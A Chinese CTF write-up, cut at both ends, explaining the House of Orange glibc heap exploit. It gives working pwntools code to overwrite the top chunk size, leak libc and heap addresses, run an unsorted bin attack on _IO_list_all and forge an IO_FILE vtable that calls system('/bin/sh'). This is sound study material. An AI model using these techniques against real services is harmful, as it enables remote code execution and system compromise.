str(3))\tsla(&#x27;name :&#x27;, str(size))\tsa(&#x27;Name:&#x27;, data)\tsla(&#x27;Price of Orange:&#x27;, str(16))\tsla(&#x27;Orange:&#x27;, &#x27;1&#x27;);def dp():\tsla(&#x27;Your choice : &#x27;, str(2))def q():\tsla(&#x27;:&#x27;, str(5))\t\n\n\n\n修改top chunk size实现free的效果原理House of Orange的核心在于在没有free函数的情况下得到一个释放的堆块(unsorted bin),这种操作的原理简单来说是当前堆的top chunk尺寸不足以满足申请分配的大小的时候，原来的top chunk会被释放并被置入unsorted bin中，通过这一点可以在没有free函数情况下获取到unsorted bins\n来看一下这个过程的详细情况，假设目前的top chunk已经不满足malloc的分配需求。 首先我们在程序中的malloc调用会执行到libc.so的_int_malloc函数中，在_int_malloc函数中，会依次检验fastbin、small bins、unsorted bin、large bins是否可以满足分配要求，因为尺寸问题这些都不符合。接下来_int_malloc函数会试图使用top chunk，在这里top chunk也不能满足分配的要求，因此会执行如下分支。\n/*Otherwise, relay to handle system-dependent cases*/else &#123;      void *p = sysmalloc(nb, av);      if (p != NULL &amp;&amp; __builtin_expect (perturb_byte, 0))    alloc_perturb (p, bytes);      return p;&#125;\n\n此时ptmalloc已经不能满足用户申请堆内存的操作，需要执行sysmalloc来向系统申请更多的空间。 但是对于堆来说有mmap和brk两种分配方式，需要让堆以brk的形式拓展，之后原有的top chunk会被置于unsorted bin中。\n综上，要实现brk拓展top chunk，但是要实现这个目的需要绕过一些libc中的check，首先，malloc的尺寸不能大于mmp_.mmap_threshold\nif ((unsigned long)(nb) &gt;= (unsigned long)(mp_.mmap_threshold) &amp;&amp; (mp_.n_mmaps &lt; mp_.n_mmaps_max))\n\n如果所需分配的 chunk 大小大于 mmap 分配阈值，默认为 128K，并且当前进程使用 mmap()分配的内存块小于设定的最大值，将使用 mmap()系统调用直接向操作系统申请内存。\n在sysmalloc函数中存在对top chunk size的check，如下\nassert((old_top == initial_top(av) &amp;&amp; old_size == 0) ||     ((unsigned long) (old_size) &gt;= MINSIZE &amp;&amp;      prev_inuse(old_top) &amp;&amp;      ((unsigned long)old_end &amp; pagemask) == 0));\n\n这里检查了top chunk的合法性，如果第一次调用本函数，top chunk可能没有初始化，所以可能old_size为0，如果top chunk已经初始化了，那么top chunk的大小必须大于等于MINSIZE，因为top chunk中包含了  fencepost，所以top chunk的大小必须要大于MINSIZE。其次Top  chunk必须标识前一个chunk处于inuse状态，并且top chunk的结束地址必定是页对齐的。此外top  chunk除去fencepost的大小必定要小于所需chunk的大小，否则在_int_malloc()函数中会使用top  chunk分割出chunk\n总结一下伪造的top chunk size的要求\n1.伪造的size必须要对齐到内存页\n2.size要大于MINSIZE(0x10)\n3.size要小于之后申请的chunk size + MINSIZE(0x10)\n4.size的prev inuse位必须为1\n之后原有的top chunk就会执行_int_free从而顺利进入unsorted bin中\n回到题中,就要得满足以上要求\npwndbg&gt; x /40gx 0x5555557580600x555555758060:\t0x0000000000000000\t0x0000000000020fa10x555555758070:\t0x0000000000000000\t0x00000000000000000x555555758080:\t0x0000000000000000\t0x00000000000000000x555555758090:\t0x0000000000000000\t0x00000000000000000x5555557580a0:\t0x0000000000000000\t0x00000000000000000x5555557580b0:\t0x0000000000000000\t0x0000000000000000\n\n然而 0x555555758060 + 0x0000000000020fa1 &#x3D;&#x3D;  0x555555779001 , 去掉inuse位,则内存是按照0x1000对齐的,则我们所能修改top chunk的大小就可以为: (x * 0x1000 + 0x20fa1) &gt; MINSIZE(0x10) (x 属于 整数),题中在添加的时候,最多只能申请大小为0x1000,那我们就通过堆溢出把top chunk size 改为: 0x0fa1, 然后再申请大于这个top chunk size的chunk就可以实现top chunk free后成为unsoted bin \nad(0x10, &#x27;A&#x27; * 0x10)p = &#x27;A&#x27; * 0x10p += p64(0) + p64(0x21) #后一个储存颜色的chunkp += p64(0x1f00000010)p += p64(0)p += p64(0) # top chunk pre_sizep += p64(0x00fa1) # top chunk size   md(0x80, p) # 堆溢出修改top chunk size\n\n实现如下\npwndbg&gt; binfastbins0x20: 0x00x30: 0x00x40: 0x00x50: 0x00x60: 0x00x70: 0x00x80: 0x0unsortedbinall: 0x5555557580a0 —▸ 0x7ffff7dd1b78 (main_arena+88) ◂— 0x5555557580a0smallbinsemptylargebinsempty\n\n\n\nLeak libc and heap addr申请一个小于刚才释放 unsoted bin 大小的一个chunk,根据unsoted bin的分割特性,会把main_arena转移,且不会清空chunk 的fd和bk的内容,所以main_arena还存在,直接打印即可获取main_arena地址泄漏libc,但在添加的时候要输入内容,为了得到完整的main_arena地址信息,就填充8个字符到chunk bk位置从而泄漏完整地址, 为了后面要采取伪造fake IO_FILE结构,就要得修改vtable指向当前伪造的虚函数表,那就要得知道heap地址了, 那怎么泄漏 heap地址呢? 由于large bin 大小的chunk有一个特点,申请成功的chunk 的 fd_nextsize和bk_nextsize会填充为自己的地址\nlarge bin申请成功后,会向fd_nextsize和bk_nextsize填充自己的地址代码如下:\n/* maintain large bins in sorted order */              if (fwd != bck)                &#123;                  /* Or with inuse bit to speed comparisons */                  size |= PREV_INUSE;                  /* if smaller than smallest, bypass loop below */                  assert ((bck-&gt;bk-&gt;size &amp; NON_MAIN_ARENA) == 0);                  //这里若申请的是符合large bin大小的chunk                  if ((unsigned long) (size) &lt; (unsigned long) (bck-&gt;bk-&gt;size))                    &#123;                      //向后退两个chunk, 而fwd-&gt;fd == victim                      fwd = bck;                       bck = bck-&gt;bk; // bck-&gt;fd =fwd-&gt;bk\t\t\t\t\t  //这里的victim 的值就是chunk的申请到的地址                      victim-&gt;fd_nextsize = fwd-&gt;fd; //还是填充自己本身地址                      victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize;  //填充之后,再取出来继续填充一样的地址,还是本身地址.                      fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;                     &#125;                  else                    &#123;                      assert ((fwd-&gt;size &amp; NON_MAIN_ARENA) == 0);                      while ((unsigned long) size &lt; fwd-&gt;size)                        &#123;                          fwd = fwd-&gt;fd_nextsize;                          assert ((fwd-&gt;size &amp; NON_MAIN_ARENA) == 0);                        &#125;                      if ((unsigned long) size == (unsigned long) fwd-&gt;size)                        /* Always insert in the second position.  */                        fwd = fwd-&gt;fd;                      else                        &#123;                          victim-&gt;fd_nextsize = fwd;                          victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;                          fwd-&gt;bk_nextsize = victim;                          victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;                        &#125;                      bck = fwd-&gt;bk;                    &#125;                &#125;              else                victim-&gt;fd_nextsize = victim-&gt;bk_nextsize = victim;            &#125;\n\n\n\n成功malloc(0x400)后填充’C’ * 8 的堆数据如下\npwndbg&gt; x /40gx 0x5555557580c00x5555557580c0:\t0x0000000000000000\t0x00000000000004110x5555557580d0:\t0x4343434343434343\t0x00007ffff7dd2188 # main_arena + 880x5555557580e0:\t0x00005555557580c0\t0x00005555557580c0 # self heap addr\n\n\n\n利用\n# leak libc base with overflowad(0x400, &#x27;C&#x27; * 0x8)dp()lib.address = u64(ru(&#x27;\\x7f&#x27;)[-5:] + &#x27;\\x7f\\x00\\x00&#x27;) - main_arena - 1640li(&#x27;libc_base &#x27; + hex(lib.address))      # leak heap addr with large binmd(0x10, &#x27;C&#x27; * 0x10)dp()ru(&#x27;CCCCCCCCCCCCCCCC&#x27;)heap = u64(ru(&#x27;\\x0a&#x27;).ljust(8, &#x27;\\x00&#x27;)) - 0xc0li(&#x27;heap &#x27; + hex(heap))\n\n\n\n触发异常劫持控制流程怎么触发呢? 只要破坏unsorted bin 链表结构,再次申请时就会触发异常,那触发异常就会打印错误信息,malloc_printerr是malloc中用来打印错误的函数，而 malloc_printerr其实是调用 __libc_message函数之后调用abort函数，abort函数其中调用了_IO_flush_all_lockp, 然后根据IO_list_all中的值去遍历IO_FILE调用IO_FILE 的vtable中的 __overflow函数指针\nunsorted bin attack 修改 _IO_list_all如何进行劫持,采用修改old top chunk 的结构,使之报错,然而我们只需要采用unsorted bin attack修改_IO_list_all的值为unsorted_chunks(av)也就是main_arena + 0x58.修改这个有什么用? 本来_IO_list_all的值是指向_IO_2_1_stderr,若修改这个值,那么在malloc报错的时候就会遍历_IO_list_all 指向的IO_FILE结构体，详细后面会说道.\nunsorted bin attack 实现攻击源码\nif (in_smallbin_range(nb) &amp;&amp; bck == unsorted_chunks(av) &amp;&amp;               victim == av-&gt;last_remainder &amp;&amp;               (unsigned long) (size) &gt; (unsigned long) (nb + MINSIZE)) &#123;               ....           &#125;           /* remove from unsorted list */           unsorted_chunks(av)-&gt;bk = bck;           bck-&gt;fd                 = unsorted_chunks(av); //实现想目标处修改值\n\n\n\n实现修改如下\npwndbg&gt; x /10gx &amp;_IO_list_all0x7ffff7dd2520 &lt;_IO_list_all&gt;:\t0x00007ffff7dd1b78\t0x00000000000000000x7ffff7dd2530:\t0x0000000000000000\t0x00000000000000000x7ffff7dd2540 &lt;_IO_2_1_stderr_&gt;:\t0x00000000fbad2086\t0x00000000000000000x7ffff7dd2550 &lt;_IO_2_1_stderr_+16&gt;:\t0x0000000000000000\t0x00000000000000000x7ffff7dd2560 &lt;_IO_2_1_stderr_+32&gt;:\t0x0000000000000000\t0x0000000000000000pwndbg&gt; x /10gx 0x00007ffff7dd1b780x7ffff7dd1b78 &lt;main_arena+88&gt;:\t0x000055555577a010\t0x00005555557584f00x7ffff7dd1b88 &lt;main_arena+104&gt;:\t0x00005555557584f0\t0x00007ffff7dd25100x7ffff7dd1b98 &lt;main_arena+120&gt;:\t0x00007ffff7dd1b88\t0x00007ffff7dd1b880x7ffff7dd1ba8 &lt;main_arena+136&gt;:\t0x00007ffff7dd1b98\t0x00007ffff7dd1b980x7ffff7dd1bb8 &lt;main_arena+152&gt;:\t0x00007ffff7dd1ba8\t0x00007ffff7dd1ba8\n\n\n\n利用\n# Control programp = &#x27;B&#x27; * 0x400p += p64(0)p += p64(0x21)p += &#x27;B&#x27; * 0x10# fake filef = p64(0)\t\t   # old top chunk prev_sizef += p64(0x100)    # old top chunk sizef += p64(0) + p64(_IO_list_all - 0x10) # unsoted bin attack实现修改 _IO_list_all\n\n\n\n劫持流程若下次申请大小为0x10的时候, 由于unsorted bin 的结构已经被修改, 0x10 &lt;&#x3D; 2*SIZE_SZ，就会触发malloc_printerr\nfor (;; )    &#123;      int iters = 0;      while ((victim = unsorted_chunks (av)-&gt;bk) != unsorted_chunks (av))        &#123;          bck = victim-&gt;bk;          if (__builtin_expect (victim-&gt;size &lt;= 2 * SIZE_SZ, 0)              || __builtin_expect (victim-&gt;size &gt; av-&gt;system_mem, 0))            malloc_printerr (check_action, &quot;malloc(): memory corruption&quot;,// 执行该函数                             chunk2mem (victim), av);          size = chunksize (victim);\n\n\n\n那么在执行malloc_printerr函数就会执行到_IO_flush_all_lockp, 来了解一下_IO_flush_all_lockp 函数\nint _IO_flush_all_lockp (int do_lock)&#123;  int result = 0;  FILE *fp;#ifdef _IO_MTSAFE_IO  _IO_cleanup_region_start_noarg (flush_cleanup);  _IO_lock_lock (list_all_lock);#endif   //循环遍历IO_FILE,采用 fp-&gt;chain来进行获取下一个IO_FILE, 那么  for (fp = (FILE *) _IO_list_all; fp != NULL; fp = fp-&gt;_chain)    &#123;      run_fp = fp;      if (do_lock)        _IO_flockfile (fp);      //check, 在后面伪造的IO_FILE中需要绕过,然后执行 _IO_OVERFLOW (fp, EOF) == EOF)      if (((fp-&gt;_mode &lt;= 0 &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base)            || (_IO_vtable_offset (fp) == 0               &amp;&amp; fp-&gt;_mode &gt; 0 &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_ptr                                    &gt; fp-&gt;_wide_data-&gt;_IO_write_base))           )          &amp;&amp; _IO_OVERFLOW (fp, EOF) == EOF) //参数传入IO_FILE的地址和EOF        result = EOF;      if (do_lock)        _IO_funlockfile (fp);      run_fp = NULL;    &#125;#ifdef _IO_MTSAFE_IO  _IO_lock_unlock (list_all_lock);  _IO_cleanup_region_end (0);#endif  return result;&#125;\n\n在_IO_flush_all_lockp函数中会根据_IO_list_all中的值,依次遍历IO_FILE,那我们就想法设法构建自己的IO_FILE,若IO_FILE满足fp-&gt;_mode &lt;&#x3D; 0 &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base 然后会调用vtable中的__overflow 函数,我们就可以伪造一个vtable,实现在调用__overflow的时候调用我们的函数\n来了解一下IO_FILE_plus结构体.\nstruct _IO_FILE_plus （size_of=0x78+0x8）&#123;  _IO_FILE file;  const struct _IO_jump_t *vtable;&#125;; struct _IO_FILE &#123;  int _flags;\t\t/* High-order word is _IO_MAGIC; rest is flags. */#define _IO_file_flags _flags  /* The following pointers correspond to the C++ streambuf protocol. */  /* Note:  Tk uses the _IO_read_ptr and _IO_read_end fields directly. */  char* _IO_read_ptr;\t/* Current read pointer */  char* _IO_read_end;\t/* End of get area. */  char* _IO_read_base;\t/* Start of putback+get area. */  char* _IO_write_base;\t/* Start of put area. */  char* _IO_write_ptr;\t/* Current put pointer. */  char* _IO_write_end;\t/* End of put area. */  char* _IO_buf_base;\t/* Start of reserve area. */  char* _IO_buf_end;\t/* End of reserve area. */  /* The following fields are used to support backing up and undo. */  char *_IO_save_base; /* Pointer to start of non-current get area. */  char *_IO_backup_base;  /* Pointer to first valid character of backup area */  char *_IO_save_end; /* Pointer to end of non-current get area. */  struct _IO_marker *_markers;  struct _IO_FILE *_chain;//储存下一个IO_FILE的地址,这是关键,后面采用一种方法实现main_arena + 88的IO_FILE结构体的这个值指向我们所构造的fake IO_FILE  int _fileno;#if 0  int _blksize;#else  int _flags2;#endif  _IO_off_t _old_offset; /* This used to be _offset but it&#x27;s too small.  */#define __HAVE_COLUMN /* temporary */  /* 1+column number of pbase(); 0 is unknown. */  unsigned short _cur_column;  signed char _vtable_offset;  char _shortbuf[1];  /*  char* _save_gptr;  char* _save_egptr; */  _IO_lock_t *_lock;#ifdef _IO_USE_OLD_IO_FILE&#125;;struct _IO_FILE_complete&#123;  struct _IO_FILE _file;#endif#if defined _G_IO_IO_FILE_VERSION &amp;&amp; _G_IO_IO_FILE_VERSION == 0x20001  _IO_off64_t _offset;# if defined _LIBC || defined _GLIBCPP_USE_WCHAR_T  /* Wide character stream stuff.  */  struct _IO_codecvt *_codecvt;  struct _IO_wide_data *_wide_data;  struct _IO_FILE *_freeres_list;  void *_freeres_buf;# else  void *__pad1;  void *__pad2;  void *__pad3;  void *__pad4;# endif  size_t __pad5;  int _mode;  /* Make sure we don&#x27;t get into trouble again.  */  char _unused2[15 * sizeof (int) - 4 * sizeof (void *) - sizeof (size_t)];#endif&#125;;\n\n\n\nvtable表中结构\nstruct _IO_jump_t&#123;    JUMP_FIELD(size_t, __dummy);    JUMP_FIELD(size_t, __dummy2);    JUMP_FIELD(_IO_finish_t, __finish);    JUMP_FIELD(_IO_overflow_t, __overflow); //后面通过伪造IO_FILE使 会调用此函数指针,就修改这个为system    JUMP_FIELD(_IO_underflow_t, __underflow);    JUMP_FIELD(_IO_underflow_t, __uflow);    JUMP_FIELD(_IO_pbackfail_t, __pbackfail);    /* showmany */    JUMP_FIELD(_IO_xsputn_t, __xsputn);    JUMP_FIELD(_IO_xsgetn_t, __xsgetn);    JUMP_FIELD(_IO_seekoff_t, __seekoff);    JUMP_FIELD(_IO_seekpos_t, __seekpos);    JUMP_FIELD(_IO_setbuf_t, __setbuf);    JUMP_FIELD(_IO_sync_t, __sync);    JUMP_FIELD(_IO_doallocate_t, __doallocate);    JUMP_FIELD(_IO_read_t, __read);    JUMP_FIELD(_IO_write_t, __write);    JUMP_FIELD(_IO_seek_t, __seek);    JUMP_FIELD(_IO_close_t, __close);    JUMP_FIELD(_IO_stat_t, __stat);    JUMP_FIELD(_IO_showmanyc_t, __showmanyc);    JUMP_FIELD(_IO_imbue_t, __imbue);#if 0    get_column;    set_column;#endif&#125;;\n\n后面就将这个__overflow 修改为system, 然而在调用这些函数指针的时候,传入的参数是IO_FILE的地址,所以后面我们需要在自己伪造的IO_FILE的头部填入’&#x2F;bin&#x2F;sh\\x00’,若能使_IO_flush_all_lockp函数在遍历的时候遍历到我们伪造的IO_FILE,且IO_FILE满足_IO_overflow函数的调用条件, 这样就能实现get shell,那么怎样才能让我们伪造的IO_FILE连接到我们自己伪造的IO_FILE呢? \n那使用unsorted bin attack修改_IO_list_all中main_arena + 0x58,后面就要得修改main_arena + 0x58处fkae IO_FILE的 chain为我们的fake IO_FILE地址,这样在执行_IO_flush_all_lockp就会根据自己伪造的IO_FILE调用我们所伪造的vtable函数了.但关键是怎样使_IO_flush_all_lockp 在遍历 IO_FILE的时候能遍历到我们伪造的IO_FILE,就要靠下面的操作了.\n修改main_arena fake file中的chain 指向我们即将伪造的IO_FILE上面的_chain 的值是我们重点要如何在main_arena + 0x58处IO_FILE中设置这个值为咱们可以掌控的fake IO_FILE地址,然而unsorted bin的链表结构已经被破坏,再次申请的时候,old top chunk就不受unsorted bin 管理,注意若大小小于0x400 的bin的管理顺序为unsorted bin -&gt; small bin,若我们修改old top chunk size 为小于0x400,就可以让当前chunk受small bin进行管理,而在small bin管理的时候, 各个大小的bin的链表头部地址会储存在main_arena中,若我们想要实现修改 main_arena + 0x58处 IO_FILE中的 _chain的值,就需要靠small bin的管理机制来进行修改\n 若我们能够计算好大小,就能实现在main_arena部分内存中储存我们的chunk地址.下面为修改old top chunk大小为0x50所看到main_arena + 0x58中IO_FILE的结构\n\npwndbg&gt; p *((struct _IO_FILE_plus*)((long int)&amp;main_arena + 0x58))$4 = &#123;  file = &#123;    _flags = 1433903120,     _IO_read_ptr = 0x5555557584f0 &quot;/bin/sh&quot;,     _IO_read_end = 0x5555557584f0 &quot;/bin/sh&quot;,     _IO_read_base = 0x7ffff7dd2510 &quot;&quot;,     _IO_write_base = 0x7ffff7dd1b88 &lt;main_arena+104&gt; &quot;\\360\\204uUUU&quot;,     _IO_write_ptr = 0x7ffff7dd1b88 &lt;main_arena+104&gt; &quot;\\360\\204uUUU&quot;,     _IO_write_end = 0x7ffff7dd1b98 &lt;main_arena+120&gt; &quot;\\210\\033\\335\\367\\377\\177&quot;,     _IO_buf_base = 0x7ffff7dd1b98 &lt;main_arena+120&gt; &quot;\\210\\033\\335\\367\\377\\177&quot;,     _IO_buf_end = 0x7ffff7dd1ba8 &lt;main_arena+136&gt; &quot;\\230\\033\\335\\367\\377\\177&quot;,     _IO_save_base = 0x7ffff7dd1ba8 &lt;main_arena+136&gt; &quot;\\230\\033\\335\\367\\377\\177&quot;,     _IO_backup_base = 0x5555557584f0 &quot;/bin/sh&quot;, # 这是small bin管理时,储存我们的堆地址    _IO_save_end = 0x5555557584f0 &quot;/bin/sh&quot;,    # 这是small bin管理时,储存我们的堆地址    _markers = 0x7ffff7dd1bc8 &lt;main_arena+168&gt;,     _chain = 0x7ffff7dd1bc8 &lt;main_arena+168&gt;,  # 下一个IO_FILE的地址,这是我们想要覆盖当前地址为old top chunk addr    _fileno = -136504360,     _flags2 = 32767,     _old_offset = 140737351850968,     _cur_column = 7144,     _vtable_offset = -35 &#x27;\\335&#x27;,     _shortbuf = &lt;incomplete sequence \\367&gt;,     _lock = 0x7ffff7dd1be8 &lt;main_arena+200&gt;,     _offset = 140737351851000,     _codecvt = 0x7ffff7dd1bf8 &lt;main_arena+216&gt;,     _wide_data = 0x7ffff7dd1c08 &lt;main_arena+232&gt;,     _freeres_list = 0x7ffff7dd1c08 &lt;main_arena+232&gt;,     _freeres_buf = 0x7ffff7dd1c18 &lt;main_arena+248&gt;,     __pad5 = 140737351851032,     _mode = -136504280,     _unused2 = &quot;\\377\\177\\000\\000(\\034\\335\\367\\377\\177\\000\\000\\070\\034\\335\\367\\377\\177\\000&quot;  &#125;,   vtable = 0x7ffff7dd1c38 &lt;main_arena+280&gt;&#125;pwndbg&gt; binfastbins0x20: 0x00x30: 0x00x40: 0x00x50: 0x00x60: 0x00x70: 0x00x80: 0x0unsortedbinall [corrupted]FD: 0x5555557584f0 —▸ 0x7ffff7dd1bb8 (main_arena+152) ◂— 0x5555557584f0BK: 0x7ffff7dd2510 ◂— 0x0smallbins0x50: 0x5555557584f0 —▸ 0x7ffff7dd1bb8 (main_arena+152) ◂— 0x5555557584f0 #释放后由small bin来管理largebinsempty\n\n\n\n那么还差0x10,就改old top chunk size 为0x60,即可在main_arena 向下偏移0x10进行储存,这就实现了在main_arena + 0x58伪造IO_FILE中实现连接我们伪造的IO_FILE,实现效果如下\npwndbg&gt; p *((struct _IO_FILE_plus*)0x00007ffff7dd1b78)$2 = &#123;  file = &#123;    _flags = 1433903120,     _IO_read_ptr = 0x5555557584f0 &quot;/bin/sh&quot;,     _IO_read_end = 0x5555557584f0 &quot;/bin/sh&quot;,     _IO_read_base = 0x7ffff7dd2510 &quot;&quot;,     _IO_write_base = 0x7ffff7dd1b88 &lt;main_arena+104&gt; &quot;\\360\\204uUUU&quot;,     _IO_write_ptr = 0x7ffff7dd1b88 &lt;main_arena+104&gt; &quot;\\360\\204uUUU&quot;,     _IO_write_end = 0x7ffff7dd1b98 &lt;main_arena+120&gt; &quot;\\210\\033\\335\\367\\377\\177&quot;,     _IO_buf_base = 0x7ffff7dd1b98 &lt;main_arena+120&gt; &quot;\\210\\033\\335\\367\\377\\177&quot;,     _IO_buf_end = 0x7ffff7dd1ba8 &lt;main_arena+136&gt; &quot;\\230\\033\\335\\367\\377\\177&quot;,     _IO_save_base = 0x7ffff7dd1ba8 &lt;main_arena+136&gt; &quot;\\230\\033\\335\\367\\377\\177&quot;,     _IO_backup_base = 0x7ffff7dd1bb8 &lt;main_arena+152&gt; &quot;\\250\\033\\335\\367\\377\\177&quot;,     _IO_save_end = 0x7ffff7dd1bb8 &lt;main_arena+152&gt; &quot;\\250\\033\\335\\367\\377\\177&quot;,     _markers = 0x5555557584f0,     _chain = 0x5555557584f0,  //这里指向 old top chunk,也就是我们伪造的堆块    _fileno = -136504360,     _flags2 = 32767,     _old_offset = 140737351850968,     _cur_column = 7144,     _vtable_offset = -35 &#x27;\\335&#x27;,     _shortbuf = &lt;incomplete sequence \\367&gt;,     _lock = 0x7ffff7dd1be8 &lt;main_arena+200&gt;,     _offset = 140737351851000,     _codecvt = 0x7ffff7dd1bf8 &lt;main_arena+216&gt;,     _wide_data = 0x7ffff7dd1c08 &lt;main_arena+232&gt;,     _freeres_list = 0x7ffff7dd1c08 &lt;main_arena+232&gt;,     _freeres_buf = 0x7ffff7dd1c18 &lt;main_arena+248&gt;,     __pad5 = 140737351851032,     _mode = -136504280,     _unused2 = &quot;\\377\\177\\000\\000(\\034\\335\\367\\377\\177\\000\\000\\070\\034\\335\\367\\377\\177\\000&quot;  &#125;,   vtable = 0x7ffff7dd1c38 &lt;main_arena+280&gt;&#125;pwndbg&gt; x /40gx 0x5555557584f00x5555557584f0:\t0x0068732f6e69622f\t0x0000000000000061 # 我们的old top chunk0x555555758500:\t0x00007ffff7dd1bc8\t0x00007ffff7dd1bc80x555555758510:\t0x0000000000000000\t0x00000000000000010x555555758520:\t0x0000000000000000\t0x00000000000000000x555555758530:\t0x0000000000000000\t0x00000000000000000x555555758540:\t0x0000000000000000\t0x00000000000000000x555555758550:\t0x0000000000000000\t0x0000000000000000\n\n利用如下:\n# Control programp = &#x27;B&#x27; * 0x400p += p64(0)p += p64(0x21)p += &#x27;B&#x27; * 0x10# fake IO_FILEf = &#x27;/bin/sh\\x00&#x27; # overflow arg -&gt; system(&#x27;/bin/sh&#x27;) 这是后续调用system会传入IO_FILE的地址f += p64(0x61)    # small bin size,使main_arena + 0x58 fake IO_FILE的_chian指向当前伪造的IO_FILE   f += p64(0) + p64(_IO_list_all - 0x10) # unsoted bin attack 修改 _IO_list_all为main_arena + 0x58\n\n\n\n伪造IO_FILE上面就实现了修改main_arena + 0x58 中 fake IO_FILE的_chain指向我们的old top chunk,那么就在old top chunk伪造IO_FILE,在伪造的时候必须要得通过检查\nif (((fp-&gt;_mode &lt;= 0 &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base)            || (_IO_vtable_offset (fp) == 0               &amp;&amp; fp-&gt;_mode &gt; 0 &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_ptr                                    &gt; fp-&gt;_wide_data-&gt;_IO_write_base))           )          &amp;&amp; _IO_OVERFLOW (fp, EOF) == EOF)        result = EOF;\n\n则fp-&gt;_mode &lt;&#x3D; 0 且fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base 且_IO_vtable_offset (fp) &#x3D;&#x3D; 0,这样才能执行_IO_OVERFLOW (fp, EOF) == EOF)\n那么利用就可以这样写\n# fake file\tf = &#x27;/bin/sh\\x00&#x27; # flag overflow arg -&gt; system(&#x27;/bin/sh&#x27;)\tf += p64(0x61)    # _IO_read_ptr small bin size\t#  unsoted bin attack\tf += p64(0) # _IO_read_end)\tf += p64(_IO_list_all - 0x10)  # _IO_read_base\t#bypass check\t# 使fp-&gt;_IO_write_base &lt; fp-&gt;_IO_write_ptr绕过检查\tf += p64(0) # _IO_write_base \tf += p64(1) # _IO_write_ptr\tf += p64(0) # _IO_write_end\tf += p64(0) # _IO_buf_base\tf += p64(0) # _IO_buf_end\tf += p64(0) # _IO_save_base\tf += p64(0) # _IO_backup_base\tf += p64(0) # _IO_save_end\tf += p64(0) # *_markers\tf += p64(0) # *_chain\tf += p32(0) # _fileno\tf += p32(0) # _flags2\tf += p64(1)  # _old_offset\tf += p16(2) # ushort _cur_colum;\tf += p8(3)  # char _vtable_offset\tf += p8(4)  # char _shrotbuf[1]\tf += p32(0) # null for alignment\tf += p64(0) # _offset\tf += p64(6) # _codecvt\tf += p64(0) # _wide_data\tf += p64(0) # _freeres_list\tf += p64(0) # _freeres_buf\tf += p64(0) # __pad5\tf += p32(0) # _mode 为了绕过检查,fp-&gt;mode &lt;=0 ((addr + 0xc8) &lt;= 0)\tf += p32(0) # _unused2    \n\n修改结果如下\npwndbg&gt; p *((struct _IO_FILE_plus*)0x5555557584f0)$1 = &#123;  file = &#123;    _flags = 1852400175,     _IO_read_ptr = 0x61 &lt;error: Cannot access memory at address 0x61&gt;,     _IO_read_end = 0x0,     _IO_read_base = 0x7ffff7dd2510 &quot;&quot;,     _IO_write_base = 0x0,     _IO_write_ptr = 0x1 &lt;error: Cannot access memory at address 0x1&gt;,     _IO_write_end = 0x0,     _IO_buf_base = 0x0,     _IO_buf_end = 0x0,     _IO_save_base = 0x0,     _IO_backup_base = 0x0,     _IO_save_end = 0x0,     _markers = 0x0,     _chain = 0x0,     _fileno = 0,     _flags2 = 0,     _old_offset = 1,     _cur_column = 2,     _vtable_offset = 3 &#x27;\\003&#x27;,     _shortbuf = &quot;\\004&quot;,     _lock = 0x0,     _offset = 6,     _codecvt = 0x0,     _wide_data = 0x0,     _freeres_list = 0x0,     _freeres_buf = 0x0,     __pad5 = 0,     _mode = 0,     _unused2 = &#x27;\\000&#x27; &lt;repeats 19 times&gt;  &#125;,   vtable = 0x5555557585c8&#125;\n\n\n伪造 vtablep += fp += p64(0) * 3 # alignment to vtablep += p64(heap + 0x5c8) # vtable指向自己p += p64(0) * 2p += p64(lib.sym[&#x27;system&#x27;]) # _IO_overflow 位置改为system   md(0x600, p) # 修改一系列所伪造好的布局   \n\n修改结果如下\npwndbg&gt; p *((struct _IO_FILE_plus*)0x5555557584f0).vtable$2 = &#123;  __dummy = 93824994346440,   __dummy2 = 0,   __finish = 0x0,   __overflow = 0x7ffff7a52390 &lt;__libc_system&gt;, #成功修改为system  __underflow = 0x0,   __uflow = 0x0,   __pbackfail = 0x0,   __xsputn = 0x0,   __xsgetn = 0x0,   __seekoff = 0x0,   __seekpos = 0x0,   __setbuf = 0x0,   __sync = 0x0,   __doallocate = 0x0,   __read = 0x0,   __write = 0x0,   __seek = 0x0,   __close = 0x0,   __stat = 0x0,   __showmanyc = 0x0,   __imbue = 0x0&#125;\n\ngetshell再次申请 0x10的时候, 由于unsorted bin 的结构已经被修改, 0x10 &lt;&#x3D; 2*SIZE_SZ，就会触发malloc_printerr,然后就开始执行各种已经布局好的各种trick,最终执行到system get shell\nfor (;; )    &#123;      int iters = 0;      while ((victim = unsorted_chunks (av)-&gt;bk) != unsorted_chunks (av))        &#123;          bck = victim-&gt;bk;          if (__builtin_expect (victim-&gt;size &lt;= 2 * SIZE_SZ, 0)              || __builtin_expect (victim-&gt;size &gt; av-&gt;system_mem, 0))            malloc_printerr (check_action, &quot;malloc(): memory corruption&quot;,// 执行该函数                             chunk2mem (victim), av);          size = chunksize (victim);\n\n\n\nsl(&#x27;1&#x27;) #get shell\n\n\n\n\nexp#!/usr/bin/env python#-*- coding:utf-8 -*-# Author: I0ganfrom pwn import *#from LibcSearcher import LibcSearcher#context.log_level=&#x27;debug&#x27;context(arch = &#x27;amd64&#x27;, os = &#x27;linux&#x27;, log_level=&#x27;debug&#x27;)exeFile = &#x27;houseoforange&#x27;libFile = &#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;#libFile = &#x27;./libc64-2.19.so&#x27;remoteIp = &quot;0.0.0.0&quot;remotePort = 0LOCAL = 1LIB   = 1r   =  lambda x : io.recv(x)ra  =  lambda   : io.recvall()rl  =  lambda   : io.recvline(keepends = True)ru  =  lambda x : io.recvuntil(x, drop = True)s   =  lambda x : io.send(x)sl  =  lambda x : io.sendline(x)sa  =  lambda x, y : io.sendafter(x, y)sla =  lambda x, y : io.sendlineafter(x, y)ia  =  lambda : io.interactive()c   =  lambda : io.close()li    = lambda x : log.info(&#x27;\\x1b[01;38;5;214m&#x27; + x + 